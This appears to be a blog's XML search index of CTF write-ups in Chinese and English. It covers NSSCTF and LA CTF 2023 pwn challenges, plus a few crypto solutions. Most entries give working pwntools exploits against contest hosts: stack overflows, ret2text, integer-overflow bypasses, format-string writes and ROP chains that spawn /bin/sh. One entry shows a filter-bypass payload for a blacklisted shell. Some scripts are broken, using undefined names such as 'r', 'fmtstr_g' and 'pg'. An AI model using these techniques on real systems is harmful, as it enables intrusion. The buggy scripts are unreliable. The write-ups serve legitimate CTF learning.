<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>NSSCTF Pwn</title>
    <link href="/2023/02/14/NSSCTFPwn%E5%88%B7%E9%A2%98/"/>
    <url>/2023/02/14/NSSCTFPwn%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-nc签到"><a href="#SWPUCTF-2021-新生赛-nc签到" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到"></a>[SWPUCTF 2021 新生赛]nc签到</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>Linux 文件操作</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>ls cat flag均无反应捏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>art = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   ((  &quot;####@@!!$$    ))</span><br><span class="hljs-string">       `#####@@!$$`  ))</span><br><span class="hljs-string">    ((  &#x27;####@!!$:</span><br><span class="hljs-string">   ((  ,####@!!$:   ))</span><br><span class="hljs-string">       .###@!!$:</span><br><span class="hljs-string">       `##@@!$:</span><br><span class="hljs-string">        `#@!!$</span><br><span class="hljs-string">  !@#    `#@!$:       @#$</span><br><span class="hljs-string">   #$     `#@!$:       !@!</span><br><span class="hljs-string">            &#x27;@!$:</span><br><span class="hljs-string">        &#x27;`\   &quot;!$: /`&#x27;</span><br><span class="hljs-string">           &#x27;\  &#x27;!: /&#x27;</span><br><span class="hljs-string">             &quot;\ : /&quot;</span><br><span class="hljs-string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span><br><span class="hljs-string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(art)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;My_shell_ProVersion&quot;</span>)<br><br>blacklist = [<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;cd&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;$&#123;IFS&#125;&#x27;</span>]  <br>//这里可以看到过滤的很多东西 导致没法直接cat flag<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    command = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> command:<br>            exit(<span class="hljs-number">0</span>)<br>    os.system(command)<br></code></pre></td></tr></table></figure><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>构造一个exp 也可以直接命令直接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,xxxxx)<br>p.sendline(<span class="hljs-string">&quot;tac$IFS$9flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv())<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>可以直接su获取root权限 然后直接cat flag</p><h1 id="SWPUCTF-2021-新生赛-gift-pwn"><a href="#SWPUCTF-2021-新生赛-gift-pwn" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn"></a>[SWPUCTF 2021 新生赛]gift_pwn</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>ret2text</p><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>查个保护先   开启了NX保护，堆栈不可执行<br>拖进IDA看一手<br><img src="/mdimg/NSSSCTF/1.png"><br>主程序中给了<code>vuln()</code>函数，直接跟进查看。<br><img src="/mdimg/NSSSCTF/2.png"><br><code>return read(0, &amp;buf, 0x64uLL);</code>：读取用户输入的数据存入<code>buf</code>变量。<br>所以：</p><ul><li><code>buf</code>变量距离rbp <code>0x10</code>。</li><li>返回地址的偏移就是<code>0x10+8</code></li><li><code>buf</code>变量可读入<code>0x64</code>大小的数据。</li><li>因此存在栈溢出。</li><li>且程序中存在<code>system()</code>函数和<code>/bin/bash</code>字符串。</li></ul><p><img src="/mdimg/NSSSCTF/3.png"><br>追一下<code>/bin/bash</code>位置<br><img src="/mdimg/NSSSCTF/4.png"><br>构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>, <span class="hljs-number">28764</span>)<br><br>gift = <span class="hljs-number">0x4005C4</span><br>g = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>) + p64(gift)<br>p.sendline(g)<br>p.sendline(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="CISCN-2019华北-PWN1"><a href="#CISCN-2019华北-PWN1" class="headerlink" title="[CISCN 2019华北]PWN1"></a>[CISCN 2019华北]PWN1</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>简单的栈溢出 + ret2text</p><h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>64位文件  开启了NX保护，堆栈不可执行<br>拖进IDA看一手<br><img src="/mdimg/NSSSCTF/5.png"><br>主程序中给了<code>func()</code>函数，直接跟进查看。<br><img src="/mdimg/NSSSCTF/6.png"><br>发现有<code>cat /flag</code>   程序逻辑就是如果v2=11.28125，就可以执行<code>cat /flag</code></p><ul><li><p><code>v1</code>变量距离rbp <code>0x30</code>。</p></li><li><p><code>v2</code>变量距离rbp<code>0x4</code>。</p></li><li><p><code>gets()</code>函数的<code>v1</code>的输入点比if中<code>v2</code>的输入点更远于rbp寄存器。</p></li><li><p>程序中存在后门函数<code>system(“cat /flag”)</code>，也就是有两种解法：</p><p> ​    ①gets函数溢出到返回地址，覆盖返回地址为后门函数；<br> ​    ②通过gets输入覆盖v2，使得if判断结果指向后门函数。</p><h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>既然离rbp<code>0x30</code>，那么到返回地址的偏移就是<code>0x30+8</code><br><img src="/mdimg/NSSSCTF/7.png"><br>其中<code>0x4006BC</code>中的jnz判断跳转即为if函数中的判断语句，因此后门函数从<code>0x4006BE</code>开始，构造exp</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28847</span>)<br><br>g = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4006BE</span>)<br>p.sendline(g)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><p><code>v1</code>，<code>v2</code>二者偏移为<code>0x30-0x4=2Ch</code><br><img src="/mdimg/NSSSCTF/8.png"><br>找到11.28125的16进制<code>4134800</code>，构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28558</span>)<br><br>g=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>)+p64(<span class="hljs-number">0x41348000</span>)<br>p.sendline(g)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="BJDCTF-2020-babystack2-0"><a href="#BJDCTF-2020-babystack2-0" class="headerlink" title="[BJDCTF 2020]babystack2.0"></a>[BJDCTF 2020]babystack2.0</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>整数溢出</p><h2 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>64位文件  开启了NX保护，堆栈不可执行<br>IDA看一下<br><img src="/mdimg/NSSSCTF/9.png"><br><code>__isoc99_scanf(&quot;%d&quot;, &amp;nbytes);</code>：用户输入的长度。<br><code>if ( (int)nbytes &gt; 10 )</code>：限制了输入条件<br><code>read(0, buf, (unsigned int)nbytes);</code>：向变量buf内读取用户输入的数据，存在栈溢出。<br><code>exit()</code>：为退出程序的函数， exit(0); 为正常退出   //只要括号内数字不为0都表示异常退出<br>存在<code>backdoor()</code><br><img src="/mdimg/NSSSCTF/10.png"><br><img src="/mdimg/NSSSCTF/11.png"></p><ul><li><code>buf</code>变量距离rbp <code>0x10</code>。</li><li><code>buf</code>到返回地址的偏移就是<code>0x10+8</code>。</li><li>程序中存在后门函数<code>system(&quot;/bin/sh&quot;)</code>。</li></ul><p>想要让read函数存在溢出，起码要让read的nbytes大于0x10，但是又被上面的if条件给限制住了，不能大于0x10，那么这里存在一个整数溢出，如果我们输入的是 -1 那么就可以绕过if条件了，同时可以看到read函数的nbytes是unsigned int，unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，这样就可以让栈溢出，构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28089</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>backdoor = <span class="hljs-number">0x400726</span><br>g = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>) + p64(backdoor)<br>p.sendline(g)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="NISACTF-2022-ReorPwn"><a href="#NISACTF-2022-ReorPwn" class="headerlink" title="[NISACTF 2022]ReorPwn?"></a>[NISACTF 2022]ReorPwn?</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><p>好像没啥东西</p><h2 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>64位文件  开了RELRO、NX、PIE保护  事实上这个题和保护没关系<br>IDA看一哈<br><img src="/mdimg/NSSSCTF/12.png"><br> 使用gets接收输入存在栈溢出，system函数直接执行了我们的输入<br><img src="/mdimg/NSSSCTF/13.png"><br><code>fun()</code> 就是接收输入然后反转，没有过滤<br>所以直接输入<code>hs/nib/</code>在<code>system(a)</code>补充一个后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28049</span>)<br><br>g=<span class="hljs-string">&#x27;hs/nib/&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;lleT:\n&#x27;</span>,g)<br>p.sendline(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>简单来说直接<code>galf tac</code>就可以了</p><h1 id="BJDCTF-2020-babystack"><a href="#BJDCTF-2020-babystack" class="headerlink" title="[BJDCTF 2020]babystack"></a>[BJDCTF 2020]babystack</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><p>ret2text</p><h2 id="解题步骤-5"><a href="#解题步骤-5" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>64位文件 开启了NX保护，堆栈不可执行<br>IDA分析<br><img src="/mdimg/NSSSCTF/14.png"><br><code>__isoc99_scanf(&quot;%d&quot;, &amp;nbytes);</code>：用户输入的长度。<br><code>read(0, buf, (unsigned int)nbytes);</code>：变量<code>nbytes</code>用户可控，存在栈溢出<br>存在<code>backdoor()</code><br><img src="/mdimg/NSSSCTF/15.png"><br><img src="/mdimg/NSSSCTF/16.png"></p><ul><li><code>buf</code>变量距离rbp <code>0x10</code>。</li><li><code>buf</code>到返回地址的偏移就是<code>0x10+8</code>。</li><li>用<code>-1</code>进行绕过。</li><li>程序中存在后门函数<code>system(&quot;/bin/sh&quot;)</code>。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28685</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x4006e6</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="NISACTF-2022-ezstack"><a href="#NISACTF-2022-ezstack" class="headerlink" title="[NISACTF 2022]ezstack"></a>[NISACTF 2022]ezstack</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2>栈溢出<h2 id="解题步骤-6"><a href="#解题步骤-6" class="headerlink" title="解题步骤"></a>解题步骤</h2>32位文件  开启了NX保护，堆栈不可执行<br>IDA看一手<br><img src="/mdimg/NSSSCTF/17.png"><br>只有一个<code>shell()</code>函数 追一手<br><img src="/mdimg/NSSSCTF/18.png"><br>72=0x48,接收0x60个字符输入，存在栈溢出<br><img src="/mdimg/NSSSCTF/19.png"><br>查看字符串 在data段发现<code>&#39;/bin/sh&#39;</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>, <span class="hljs-number">28115</span>)<br>system = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br>g = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>) + p32(system) + p32(<span class="hljs-number">0xabcdabcd</span>) + p32(<span class="hljs-number">0x0804A024</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to NISACTF\n&quot;</span>, g)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF 2023</title>
    <link href="/2023/02/14/LACTF2023/"/>
    <url>/2023/02/14/LACTF2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/LACTF2023/lactf.gif"></p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-gatekeep"><a href="#1-gatekeep" class="headerlink" title="1. gatekeep"></a>1. gatekeep</h4><p>There is an overflow in the gets() function, so if the input is greater than char s1[15], the check() function can be bypassed and the flag can be obtained.</p><p><img src="/mdimg/LACTF2023/6.png"></p><h4 id="2-bot"><a href="#2-bot" class="headerlink" title="2. bot"></a>2. bot</h4><p><code>gets()</code> has an overflow, and <code>strcmp()</code> has a bug where it stops reading input after a NULL byte. So the question asks you to take the input, then compare it to some string before returning it. All you have to do is write a NULL byte-terminated string, and the write buffer overflows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="3-rut-roh-relro"><a href="#3-rut-roh-relro" class="headerlink" title="3.rut-roh-relro"></a>3.<strong>rut-roh-relro</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="4-redact"><a href="#4-redact" class="headerlink" title="4.redact"></a>4.redact</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="1-one-more-time-pad"><a href="#1-one-more-time-pad" class="headerlink" title="1. one-more-time-pad"></a>1. one-more-time-pad</h4><p>Just XOR.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2-chinese-lazy-theorem-1"><a href="#2-chinese-lazy-theorem-1" class="headerlink" title="2. chinese-lazy-theorem-1"></a>2. chinese-lazy-theorem-1</h4><p>Make the modulus greater than the maximum value of the target, which is p*q, to leak the target, and then get the flag according to the target.<br><img src="/mdimg/LACTF2023/1.png"></p><h4 